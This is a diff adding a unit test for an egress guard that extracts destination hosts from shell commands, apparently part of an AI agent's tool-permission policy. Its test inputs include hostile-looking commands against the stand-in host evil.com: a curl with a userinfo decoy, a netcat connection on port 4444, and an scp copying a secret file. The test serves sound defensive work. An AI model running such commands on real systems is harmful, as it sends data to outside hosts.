@@ -233,6 +233,22 @@ async def test_egress_guard_enforces_host_allowlist() -> None:
     assert "evil.com" in blocked.observation and "allowlist" in blocked.observation.lower()
 
 
+def test_destination_hosts_resists_bypasses_and_overblocks() -> None:
+    from app.tools.policy import destination_hosts as dh
+
+    # Bypasses that must be caught (the real host, not a decoy / not empty):
+    assert dh("curl http://api.github.com@evil.com/steal") == {"evil.com"}  # userinfo decoy
+    assert dh("curl evil.com") == {"evil.com"}  # scheme-less
+    assert dh("wget files.example.org/a") == {"files.example.org"}
+    assert "evil.com" in dh("nc evil.com 4444")
+    # Over-blocks that must NOT extract a false host:
+    assert dh("curl -X POST example.com") == {"example.com"}  # POST is not a host
+    assert dh("curl -o output.txt example.com") == {"example.com"}  # flag value skipped
+    assert dh("ssh git@github.com") == {"github.com"}  # user@ stripped
+    assert dh("scp secret.txt deploy@github.com:/tmp/") == {"github.com"}  # host, not the file
+    assert dh("curl https://ok.com/x # http://evil.com") == {"ok.com"}  # comment ignored
+
+
 def test_interpreter_network_oneliners_are_flagged_for_egress() -> None:
     from app.tools.policy import network_command_reason
 
